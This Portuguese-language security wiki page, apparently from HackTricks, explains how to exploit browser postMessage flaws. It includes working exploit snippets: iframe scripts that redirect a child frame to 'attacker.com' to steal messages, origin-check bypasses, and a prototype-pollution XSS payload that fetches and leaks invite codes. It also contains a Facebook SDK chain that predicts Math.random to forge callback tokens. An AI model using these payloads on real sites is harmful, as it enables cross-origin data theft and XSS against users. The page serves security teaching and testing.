# Vulnerabilidades do PostMessage

{{#include ../../banners/hacktricks-training.md}}

## Enviar **PostMessage**

**PostMessage** utiliza a seguinte função para enviar uma mensagem:
```bash
targetWindow.postMessage(message, targetOrigin, [transfer]);

# postMessage to current page
window.postMessage('{"__proto__":{"isAdmin":True}}', '*')

# postMessage to an iframe with id "idframe"
<iframe id="idframe" src="http://victim.com/"></iframe>
document.getElementById('idframe').contentWindow.postMessage('{"__proto__":{"isAdmin":True}}', '*')

# postMessage to an iframe via onload
<iframe src="https://victim.com/" onload="this.contentWindow.postMessage('<script>print()</script>','*')">

# postMessage to popup
win = open('URL', 'hack', 'width=800,height=300,top=500');
win.postMessage('{"__proto__":{"isAdmin":True}}', '*')

# postMessage to an URL
window.postMessage('{"__proto__":{"isAdmin":True}}', 'https://company.com')

# postMessage to iframe inside popup
win = open('URL-with-iframe-inside', 'hack', 'width=800,height=300,top=500');
## loop until win.length == 1 (until the iframe is loaded)
win[0].postMessage('{"__proto__":{"isAdmin":True}}', '*')
```
Note que **targetOrigin** pode ser um '\*' ou uma URL como _https://company.com._\
No **segundo cenário**, a **mensagem só pode ser enviada para esse domínio** (mesmo que a origem do objeto Window seja diferente).\
Se o **wildcard** for usado, **mensagens podem ser enviadas para qualquer domínio**, e serão enviadas para a origem do objeto Window.

### Atacando iframe & wildcard em **targetOrigin**

Como explicado em [**this report**](https://blog.geekycat.in/google-vrp-hijacking-your-screenshots/) se você encontrar uma página que pode ser **iframed** (sem proteção `X-Frame-Header`) e que esteja **enviando mensagens sensíveis** via **postMessage** usando um **wildcard** (\*), você pode **modificar** a **origem** do **iframe** e **leak** a **mensagem sensível** para um domínio controlado por você.\
Note que se a página puder ser iframed mas o **targetOrigin** estiver **definido para uma URL e não para um wildcard**, esse **truque não funcionará**.
```html
<html>
<iframe src="https://docs.google.com/document/ID" />
<script>
setTimeout(exp, 6000); //Wait 6s

//Try to change the origin of the iframe each 100ms
function exp(){
setInterval(function(){
window.frames[0].frame[0][2].location="https://attacker.com/exploit.html";
}, 100);
}
</script>
```
## addEventListener exploitation

**`addEventListener`** é a função usada pelo JS para declarar a função que está **esperando `postMessages`**.\
Um código semelhante ao seguinte será usado:
```javascript
window.addEventListener(
"message",
(event) => {
if (event.origin !== "http://example.org:8080") return

// ...
},
false
)
```
Note neste caso como a **primeira coisa** que o código faz é **verificar a origem**. Isto é tremendamente **importante**, principalmente se a página for fazer **algo sensível** com a informação recebida (como trocar uma password). **Se não verificar a origem, atacantes podem fazer vítimas enviarem dados arbitrários para estes endpoints** e alterar as passwords das vítimas (neste exemplo).

### Enumeração

Para **encontrar event listeners** na página atual você pode:

- **Procurar** no código JS por `window.addEventListener` e `$(window).on` (_JQuery version_)
- **Executar** no console das developer tools: `getEventListeners(window)`

![](<../../images/image (618) (1).png>)

- **Vá para** _Elements --> Event Listeners_ nas developer tools do navegador

![](<../../images/image (396).png>)

- Use uma **browser extension** como [**https://github.com/benso-io/posta**](https://github.com/benso-io/posta) ou [https://github.com/fransr/postMessage-tracker](https://github.com/fransr/postMessage-tracker). Essas browser extensions irão **interceptar todas as mensagens** e mostrá-las para você.

### Bypasses de verificação de origem

- **`event.isTrusted`** attribute é considerado seguro pois retorna `True` apenas para eventos gerados por ações genuínas do usuário. Embora seja difícil de bypassar se implementado corretamente, sua importância em checagens de segurança é notável.
- O uso de **`indexOf()`** para validação de origem em eventos PostMessage pode ser suscetível a bypass. Um exemplo ilustrando essa vulnerabilidade é:

```javascript
"https://app-sj17.marketo.com".indexOf("https://app-sj17.ma")
```

- O método **`search()`** de `String.prototype.search()` é destinado a expressões regulares, não strings. Passar qualquer coisa que não seja um regexp leva à conversão implícita para regex, tornando o método potencialmente inseguro. Isso acontece porque, em regex, um ponto (.) age como coringa, permitindo o bypass da validação com domínios especialmente construídos. Por exemplo:

```javascript
"https://www.safedomain.com".search("www.s.fedomain.com")
```

- A função **`match()`**, similar a `search()`, processa regex. Se o regex for mal estruturado, pode ser suscetível a bypass.
- A função **`escapeHtml`** destina-se a sanitizar entradas escapando caracteres. Entretanto, ela não cria um novo objeto escapado, mas sobrescreve as propriedades do objeto existente. Esse comportamento pode ser explorado. Em particular, se um objeto puder ser manipulado de modo que sua propriedade controlada não reconheça `hasOwnProperty`, o `escapeHtml` não funcionará como esperado. Isso é demonstrado nos exemplos abaixo:

- Falha Expectável:

```javascript
result = u({
message: "'\"<b>\\",
})
result.message // "&#39;&quot;&lt;b&gt;\"
```

- Bypassando o escape:

```javascript
result = u(new Error("'\"<b>\\"))
result.message // "'"<b>\"
```

No contexto desta vulnerabilidade, o objeto `File` é notavelmente explorável devido à sua propriedade somente-leitura `name`. Essa propriedade, quando usada em templates, não é sanitizada pela função `escapeHtml`, levando a riscos de segurança potenciais.

- A propriedade `document.domain` em JavaScript pode ser definida por um script para encurtar o domínio, permitindo uma aplicação mais relaxada da política de mesma origem dentro do mesmo domínio pai.

### Bypass de e.origin == window.origin

Ao embutir uma página web dentro de um **sandboxed iframe** usando %%%%%%, é crucial entender que a origem do iframe será definida como null. Isso é particularmente importante ao lidar com **sandbox attributes** e suas implicações na segurança e funcionalidade.

Ao especificar **`allow-popups`** no atributo sandbox, qualquer popup aberto a partir do iframe herda as restrições de sandbox do seu pai. Isso significa que, a menos que o atributo **`allow-popups-to-escape-sandbox`** também esteja incluído, a origem da janela popup também será definida como `null`, alinhando-se com a origem do iframe.

Consequentemente, quando um popup é aberto nessas condições e uma mensagem é enviada do iframe para o popup usando **`postMessage`**, tanto o emissor quanto o receptor terão suas origens definidas como `null`. Essa situação leva a um cenário onde **`e.origin == window.origin`** avalia para true (`null == null`), porque tanto o iframe quanto o popup compartilham o mesmo valor de origem `null`.

Para mais informações **leia**:


{{#ref}}
bypassing-sop-with-iframes-1.md
{{#endref}}

### Bypassando e.source

É possível verificar se a mensagem veio da mesma janela em que o script está escutando (especialmente interessante para **Content Scripts from browser extensions** checarem se a mensagem foi enviada da mesma página):
```javascript
// If it’s not, return immediately.
if (received_message.source !== window) {
return
}
```
Você pode forçar o **`e.source`** de uma mensagem a ser null criando um **iframe** que **envia** o **postMessage** e é **excluído imediatamente**.

For more information **read:**


{{#ref}}
bypassing-sop-with-iframes-2.md
{{#endref}}

### X-Frame-Header bypass

Para realizar esses ataques idealmente você poderá **put the victim web page** dentro de um `iframe`. Mas alguns cabeçalhos como `X-Frame-Header` podem **impedir** esse **comportamento**.\
Nesses cenários você ainda pode usar um ataque menos furtivo. Você pode abrir uma nova aba para a aplicação web vulnerável e comunicar-se com ela:
```html
<script>
var w=window.open("<url>")
setTimeout(function(){w.postMessage('text here','*');}, 2000);
</script>
```
### Roubando mensagem enviada ao iframe filho bloqueando a página principal

Na página a seguir você pode ver como poderia roubar os **dados postmessage sensíveis** enviados para um **iframe filho** ao **bloquear** a **página principal** antes de enviar os dados e abusar de um **XSS no iframe filho** para **leak os dados** antes de serem recebidos:


{{#ref}}
blocking-main-page-to-steal-postmessage.md
{{#endref}}

### Roubando mensagem modificando a localização do iframe

Se você puder iframar uma página da web sem X-Frame-Header que contenha outro iframe, você pode **mudar a localização desse iframe filho**, então se ele estiver recebendo um **postmessage** enviado usando um **wildcard**, um atacante poderia **mudar** a **origin** desse iframe para uma página **controlada** por ele e **roubar** a mensagem:


{{#ref}}
steal-postmessage-modifying-iframe-location.md
{{#endref}}

### postMessage para Prototype Pollution e/ou XSS

Em cenários onde os dados enviados via `postMessage` são executados por JS, você pode **incluir** a **página** em um **iframe** e **explorar** o **prototype pollution/XSS** enviando o exploit via `postMessage`.

Algumas XSS muito bem explicadas através do `postMessage` podem ser encontradas em [https://jlajara.gitlab.io/web/2020/07/17/Dom_XSS_PostMessage_2.html](https://jlajara.gitlab.io/web/2020/07/17/Dom_XSS_PostMessage_2.html)

Exemplo de um exploit para abusar de **Prototype Pollution e depois XSS** através de um `postMessage` para um `iframe`:
```html
<html>
<body>
<iframe
id="idframe"
src="http://127.0.0.1:21501/snippets/demo-3/embed"></iframe>
<script>
function get_code() {
document
.getElementById("iframe_victim")
.contentWindow.postMessage(
'{"__proto__":{"editedbymod":{"username":"<img src=x onerror=\\"fetch(\'http://127.0.0.1:21501/api/invitecodes\', {credentials: \'same-origin\'}).then(response => response.json()).then(data => {alert(data[\'result\'][0][\'code\']);})\\" />"}}}',
"*"
)
document
.getElementById("iframe_victim")
.contentWindow.postMessage(JSON.stringify("refresh"), "*")
}

setTimeout(get_code, 2000)
</script>
</body>
</html>
```
Para **mais informações**:

- Link to page about [**prototype pollution**](../deserialization/nodejs-proto-prototype-pollution/index.html)
- Link to page about [**XSS**](../xss-cross-site-scripting/index.html)
- Link to page about [**client side prototype pollution to XSS**](../deserialization/nodejs-proto-prototype-pollution/index.html#client-side-prototype-pollution-to-xss)

### Prevendo **`Math.random()`** callback tokens in postMessage bridges

Quando a validação de mensagens usa um “shared secret” gerado com `Math.random()` (ex.: `guid() { return "f" + (Math.random() * (1<<30)).toString(16).replace(".", "") }`) e o mesmo helper também nomeia iframes de plugin, você pode recuperar outputs do PRNG e forjar mensagens confiáveis:

- **Leak PRNG outputs via `window.name`:** O SDK nomeia automaticamente os iframes de plugin com `guid()`. Se você controla o top frame, iframe a página vítima, então navegue o plugin iframe para sua origem (ex.: `window.frames[0].frames[0].location='https://attacker.com'`) e leia `window.frames[0].frames[0].name` para obter um output cru de `Math.random()`.
- **Force more outputs without reloads:** Alguns SDKs expõem um caminho de reinit; no FB SDK, disparar `init:post` com `{xfbml:1}` força `XFBML.parse()`, destrói/recria o plugin iframe e gera novos nomes/IDs de callback. Reinit repetidos produzem tantos outputs do PRNG quanto necessário (observe chamadas internas extras a `Math.random()` para IDs de callback/iframe, então solvers devem pular valores intermediários).
- **Trusted-origin delivery via parameter pollution:** Se um endpoint de plugin first-party reflete um parâmetro não sanitizado no payload cross-window (ex.: `/plugins/feedback.php?...%23relation=parent.parent.frames[0]%26cb=PAYLOAD%26origin=TARGET`), você pode injetar `&type=...&iconSVG=...` preservando a origem confiável `facebook.com`.
- **Predict the next callback:** Convert leaked iframe names back to floats in `[0,1)` e alimente vários valores (mesmo não consecutivos) em um preditor V8 `Math.random` (ex.: baseado em Z3). Gere o próximo `guid()` localmente para forjar o token de callback esperado.
- **Trigger the sink:** Construa os dados do postMessage para que a bridge dispare `xd.mpn.setupIconIframe` e injete HTML em `iconSVG` (ex.: URL-encoded `<img src=x onerror=...>`), alcançando DOM XSS dentro da origem que hospeda; a partir daí, iframes same-origin (OAuth dialogs, arbiters, etc.) podem ser lidos.
- **Framing quirks help:** A cadeia requer framing. Em alguns webviews mobile, `X-Frame-Options` pode degradar para o não suportado `ALLOW-FROM` quando `frame-ancestors` está presente, e parâmetros “compat” podem forçar `frame-ancestors` permissivos, habilitando o side channel `window.name`.

#### Exemplo mínimo de mensagem forjada
```javascript
// predictedFloat is the solver output for the next Math.random()
const callback = "f" + (predictedFloat * (1 << 30)).toString(16).replace(".", "")
const payload =
callback +
"&type=mpn.setupIconIframe&frameName=x" +
"&iconSVG=%3cimg%20src%3dx%20onerror%3dalert(document.domain)%3e"
const fbMsg = `https://www.facebook.com/plugins/feedback.php?api_key&channel_url=https://staticxx.facebook.com/x/connect/xd_arbiter/?version=42%23relation=parent.parent.frames[0]%26cb=${encodeURIComponent(payload)}%26origin=https://www.facebook.com`
iframe.location = fbMsg // sends postMessage from facebook.com with forged callback
```
## Referências

- [https://jlajara.gitlab.io/web/2020/07/17/Dom_XSS_PostMessage_2.html](https://jlajara.gitlab.io/web/2020/07/17/Dom_XSS_PostMessage_2.html)
- [https://dev.to/karanbamal/how-to-spot-and-exploit-postmessage-vulnerablities-36cd](https://dev.to/karanbamal/how-to-spot-and-exploit-postmessage-vulnerablities-36cd)
- Para praticar: [https://github.com/yavolo/eventlistener-xss-recon](https://github.com/yavolo/eventlistener-xss-recon)
- [Facebook JavaScript SDK Math.random callback prediction → DOM XSS writeup](https://ysamm.com/uncategorized/2026/01/17/math-random-facebook-sdk.html)
- [V8 Math.random() state recovery (Z3 predictor)](https://github.com/PwnFunction/v8-randomness-predictor)

{{#include ../../banners/hacktricks-training.md}}
